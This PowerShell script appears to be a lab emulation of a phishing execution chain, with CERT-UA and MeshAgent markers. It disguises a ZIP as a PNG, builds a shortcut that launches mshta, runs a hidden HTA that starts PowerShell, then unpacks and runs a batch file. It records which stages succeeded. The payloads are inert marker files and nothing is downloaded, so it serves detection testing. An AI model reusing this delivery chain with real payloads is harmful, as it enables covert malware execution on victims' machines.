param([string]$WorkDir)
$ErrorActionPreference = 'Stop'
$missing = @('mshta.exe','powershell.exe','Compress-Archive','Expand-Archive') | Where-Object { -not (Get-Command $_ -ErrorAction SilentlyContinue) }
if ($missing.Count) {
  @{ preflight = @{ ok = $false; missing = ($missing -join ',') } } | ConvertTo-Json -Compress -Depth 4 | Set-Content -LiteralPath (Join-Path $WorkDir 'result.json') -Encoding ASCII
  return
}
$payload = Join-Path $WorkDir 'package'
New-Item -ItemType Directory -Path $payload -Force | Out-Null
$marker = Join-Path $WorkDir 'batch-marker.txt'
$markerEscaped = $marker.Replace('%','%%')
'@echo off' + "`r`necho CERTUA_LAB>" + '"' + $markerEscaped + '"' | Set-Content -LiteralPath (Join-Path $payload 'Main.bat') -Encoding ASCII
'<html><body>CERTUA_LAB_ONLY</body></html>' | Set-Content -LiteralPath (Join-Path $payload 'Registry.hta') -Encoding ASCII
'INERT_MESHAGENT_MARKER' | Set-Content -LiteralPath (Join-Path $payload 'update.exe') -Encoding ASCII
$zip = Join-Path $WorkDir 'Front.zip'
Compress-Archive -Path (Join-Path $payload '*') -DestinationPath $zip -Force
$disguised = Join-Path $WorkDir 'Front.png'
Copy-Item -LiteralPath $zip -Destination $disguised
$bootstrap = Join-Path $WorkDir 'bootstrap.ps1'
$expanded = Join-Path $WorkDir 'unpacked'
@"
`$ErrorActionPreference = 'Stop'
Copy-Item -LiteralPath '$($disguised.Replace("'","''"))' -Destination '$($zip.Replace("'","''"))' -Force
Expand-Archive -LiteralPath '$($zip.Replace("'","''"))' -DestinationPath '$($expanded.Replace("'","''"))' -Force
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', ('"' + '$($expanded.Replace("'","''"))' + '\Main.bat"') -Wait -NoNewWindow
"@ | Set-Content -LiteralPath $bootstrap -Encoding ASCII
$hta = Join-Path $WorkDir 'start.hta'
$jsPath = $bootstrap.Replace('\','\\').Replace("'","\'")
@"
<html><head><HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize" /></head><script>
var shell = new ActiveXObject('WScript.Shell');
shell.Run('powershell.exe -NoProfile -File "' + '$jsPath' + '"', 0, false); window.close();
</script></html>
"@ | Set-Content -LiteralPath $hta -Encoding ASCII
$lnk = Join-Path $WorkDir 'invitation.lnk'
$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($lnk)
$shortcut.TargetPath = (Get-Command mshta.exe).Source
$shortcut.Arguments = '"' + $hta + '"'
$shortcut.Save()
$phases = @{ lnk = (Test-Path -LiteralPath $lnk); hta = $false; unpack = $false; batch = $false }
Invoke-Item -LiteralPath $lnk
for ($i=0; $i -lt 50 -and -not (Test-Path -LiteralPath $marker); $i++) { Start-Sleep -Milliseconds 200 }
$phases.hta = Test-Path -LiteralPath $expanded
$phases.unpack = Test-Path -LiteralPath (Join-Path $expanded 'Registry.hta')
$phases.batch = (Test-Path -LiteralPath $marker) -and ((Get-Content -LiteralPath $marker -Raw).Trim() -eq 'CERTUA_LAB')
@{ phases = $phases; metrics = @{ localArchiveBytes = (Get-Item -LiteralPath $disguised).Length; localShortcut = $phases.lnk; remoteDownloads = 0 } } |
  ConvertTo-Json -Compress -Depth 5 | Set-Content -LiteralPath (Join-Path $WorkDir 'result.json') -Encoding ASCII
